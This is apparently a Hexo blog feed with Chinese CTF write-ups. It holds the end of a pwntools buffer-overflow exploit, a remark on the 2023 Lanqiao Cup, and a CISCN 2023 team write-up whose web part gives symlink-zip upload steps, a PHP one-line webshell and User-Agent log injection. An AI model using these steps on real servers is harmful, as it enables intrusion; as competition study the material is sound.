punctuation">:</span>u64<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>info <span class="token operator">=</span> <span class="token keyword">lambda</span> tag<span class="token punctuation">,</span> addr <span class="token punctuation">:</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span>tag <span class="token operator">+</span> <span class="token string">" -> "</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">)</span>ia <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token punctuation">:</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>backdoor <span class="token operator">=</span> <span class="token number">0x4011B1</span>payload <span class="token operator">=</span> <span class="token string">b'B'</span> <span class="token operator">*</span> <span class="token number">0x20</span> <span class="token operator">+</span> <span class="token string">b'deadbeef'</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>backdoor<span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>ia<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="杂谈："><a href="#杂谈：" class="headerlink" title="杂谈："></a>杂谈：</h2><blockquote><p>以下为个人观点</p></blockquote><p>今年的蓝桥杯可以说是破事一堆，作为网安这边第一个交钱比赛的赛事，第一个双机位监考同时设有监考老师，禁止查外网，甚至禁止pip的比赛，今年的蓝桥杯网安都有开创性的意义</p><p>如果我没记错的话，第一次定的时间是5月27-28，然后果不其然跟CISCN撞了，之后改时间啥啥的作为一个看乐子的人倒是看了个尽兴，同时今年一些高校，在与蓝桥杯合作的高校在没有接触过CTF的同学们中宣传本届蓝桥杯网络安全大赛…….</p><p>最后的结果已经是省赛能做一道题就能稳定三等奖了，团队中全栈大佬甚至在比赛中短暂登顶初赛第一，最后前五十，因为蓝桥杯在算法那边的名声在外还真有一些没接触过CTF的兄弟报名了蓝桥杯网络安全大赛，最后0解饮恨</p><p>只能说不好评价也不想评价，蓝桥杯赛事主办方你开心就好</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 蓝桥杯 </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023年ciscn题解</title>
      <link href="/2023/05/27/2023%E5%B9%B4ciscn%E9%A2%98%E8%A7%A3/"/>
      <url>/2023/05/27/2023%E5%B9%B4ciscn%E9%A2%98%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h1 id="DebuGGerrr-战队WRITEUP"><a href="#DebuGGerrr-战队WRITEUP" class="headerlink" title="DebuGGerrr 战队WRITEUP"></a>DebuGGerrr 战队WRITEUP</h1><h2 id="一、战队信息"><a href="#一、战队信息" class="headerlink" title="一、战队信息"></a>一、战队信息</h2><p>战队名称： DebuGGerrr </p><p>战队排名：261</p><h2 id="二、解题情况"><a href="#二、解题情况" class="headerlink" title="二、解题情况"></a>二、解题情况</h2><p> <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230528173741.png">  </p><p>[TOC]</p><h2 id="三、解题过程"><a href="#三、解题过程" class="headerlink" title="三、解题过程"></a>三、解题过程</h2><h3 id="杂项："><a href="#杂项：" class="headerlink" title="杂项："></a>杂项：</h3><h4 id="签到卡："><a href="#签到卡：" class="headerlink" title="签到卡："></a>签到卡：</h4><p> 随便输入得到hint，关注公众号，得到他的提示，输入 print(open(‘/flag’).read())得到flag</p><h4 id="国粹："><a href="#国粹：" class="headerlink" title="国粹："></a>国粹：</h4><p>在最初的思路里是一位题目是一个形如E(x)=(ax+b)(modm)的类仿射密码</p><p>后面试着要不把这些画出来看下，在写了几串之后看到了flag….然后因为分工，两个人写点坐标的格式不一样，最终Python代码如下…..</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt<span class="token keyword">import</span> pandas <span class="token keyword">as</span> pd<span class="token comment">#读入文件</span>file_path <span class="token operator">=</span> <span class="token string">"data.txt"</span>df <span class="token operator">=</span> pd<span class="token punctuation">.</span>read_table<span class="token punctuation">(</span>file_path<span class="token punctuation">,</span> header<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token comment">#定义 x  y变量</span>x <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>y <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token comment">#定义颜色变量</span>color <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token punctuation">,</span> <span class="token string">'g'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">,</span> <span class="token string">'m'</span><span class="token punctuation">,</span> <span class="token string">'y'</span><span class="token punctuation">,</span> <span class="token string">'k'</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">]</span>xx <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">]</span>yy <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">29</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">24</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">29</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">21</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">24</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">29</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">21</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">28</span><span class="token punctuation">,</span><span class="token number">29</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">21</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">29</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">24</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">29</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">29</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">,</span><span class="token number">21</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">24</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">,</span><span class="token number">31</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">24</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">24</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">24</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">24</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">24</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">24</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">21</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">24</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">24</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">24</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">]</span><span class="token comment">#用for循环将文件中的值赋值给x，y</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>df<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    x<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>df<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">','</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    y<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>df<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">','</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>xx<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    x<span class="token punctuation">.</span>append<span class="token punctuation">(</span>xx<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>    y<span class="token punctuation">.</span>append<span class="token punctuation">(</span>yy<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment">#画图</span>plt<span class="token punctuation">.</span>scatter<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">,</span> c<span class="token operator">=</span>color<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> edgecolors<span class="token operator">=</span><span class="token string">'r'</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="https://shierjinghuang.github.io/2023/05/27/2023%E5%B9%B4ciscn%E9%A2%98%E8%A7%A3/Ciscn%20%E6%95%A3%E7%82%B9%E5%9B%BE.png" style="zoom:67%;" /><blockquote><p> flag{202305012359}</p></blockquote><h4 id="被加密的生产流量"><a href="#被加密的生产流量" class="headerlink" title="被加密的生产流量:"></a>被加密的生产流量:</h4><p>追踪流发现base编码</p><img src="https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/20230527141401.png" style="zoom: 33%;" /><p>base32编码，解码得到flag</p><blockquote><p>flag{c1f_fi1g_1000}</p></blockquote><h4 id="pyshell"><a href="#pyshell" class="headerlink" title="pyshell:"></a>pyshell:</h4><p>本题为python的shell终端，拼接读取flag的字符串后用eval()进行执行，即可获得flag</p><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230528145149.png" style="zoom: 67%;" /><blockquote><p>flag{2c9b76d6-8379-4dd8-a95a-a383420575f5}</p></blockquote><h3 id="web"><a href="#web" class="headerlink" title="web"></a>web</h3><h4 id="unzip："><a href="#unzip：" class="headerlink" title="unzip："></a>unzip：</h4><p>建立软连接实现，</p><p>参考博客：<code>https://forum.butian.net/share/906</code></p><p>先建立软连接</p><pre class="line-numbers language-none"><code class="language-none">ln -s &#x2F;var&#x2F;www&#x2F;html test<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">zip --symlinks test.zip .&#x2F;*<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>创建 test文件</p><pre class="line-numbers language-none"><code class="language-none">mkdir test<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>cd 进去创建cmd.php</p><pre class="line-numbers language-none"><code class="language-none">vim cmd.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>往里面写入一句话木马</p><pre class="line-numbers language-none"><code class="language-none">&lt;?php @eval($_POST[&#39;shell&#39;]);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>退回上级目录，压缩test文件夹</p><pre class="line-numbers language-none"><code class="language-none">zip -r test1.zip .&#x2F;*<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>先上传test.zip 后上传test1.zip，然后直接蚁剑连上</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;eci-2ze4nvw7kl74qmeixz3h.cloudeci1.ichunqiu.com&#x2F;cmd.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>找到flag即可</p><h4 id="dumpit"><a href="#dumpit" class="headerlink" title="dumpit"></a>dumpit</h4><p>对/flag下所有提供的参数进行测试，发现提供的第二个参数可以到日志</p><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230528145934.png" style="zoom:50%;" /><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230528150053.png" style="zoom:50%;" /><p>过滤了post和get，不能直接将木马写入参数中执行</p><p>这里采用echo重定向的方式，将待执行的命令写入到User-Agent中，并重定向到/app/log/a.php中</p><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230528150351.png" style="zoom:50%;" /><p>访问/log/a.php发现可以成功执行</p><p>最后在env环境变量中找到flag</p><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230528150515.png" style="zoom: 50%;" /><blockquote><p>flag{290a8dfa-4d33-4ae2-a781-ef17e464d0bc}</p></blockquote><h3 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h3><h4 id="Sign-in-passwd"><a href="#Sign-in-passwd" class="headerlink" title="Sign_in_passwd:"></a>Sign_in_passwd:</h4><p>是一道Base64换表题目，使用CyberChef的Base64转码功能，可以自定义Base64表格，输入需要转码的字符串，即可得flag ，题目给的表中有部分经过url编码，解码后便可以正常实现</p><h4 id="基于国密SM2算法的密钥密文分发"><a href="#基于国密SM2算法的密钥密文分发" class="headerlink" 